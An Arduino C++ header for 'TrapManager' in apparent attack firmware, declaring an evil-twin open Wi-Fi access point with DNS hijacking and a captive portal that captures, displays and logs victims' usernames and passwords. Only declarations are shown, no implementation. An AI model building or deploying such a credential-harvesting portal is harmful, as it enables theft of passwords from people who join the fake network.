/*
 * NOCTURNE_OS — TrapManager: Evil Twin AP + Captive Portal.
 * Open WiFi "FREE_WIFI_CONNECT", DNS hijack to 192.168.4.1, dark portal
 * captures username/password for display and logging.
 */
#ifndef NOCTURNE_TRAP_MANAGER_H
#define NOCTURNE_TRAP_MANAGER_H

#include <Arduino.h>

#define TRAP_LAST_PASSWORD_LEN 32
#define TRAP_LAST_PASSWORD_DISPLAY_MS 5000

class TrapManager {
public:
  TrapManager();
  void start();
  void stop();
  void tick();

  bool isActive() const { return active_; }
  int getClientCount() const;
  int getLogsCaptured() const { return logsCaptured_; }
  const char *getLastPassword() const { return lastPassword_; }
  unsigned long getLastPasswordShowUntil() const {
    return lastPasswordShowUntil_;
  }

private:
  void setupHandlers();
  void servePortal();
  void handlePost();

  bool active_ = false;
  int logsCaptured_ = 0;
  char lastPassword_[TRAP_LAST_PASSWORD_LEN];
  unsigned long lastPasswordShowUntil_ = 0;
};

#endif
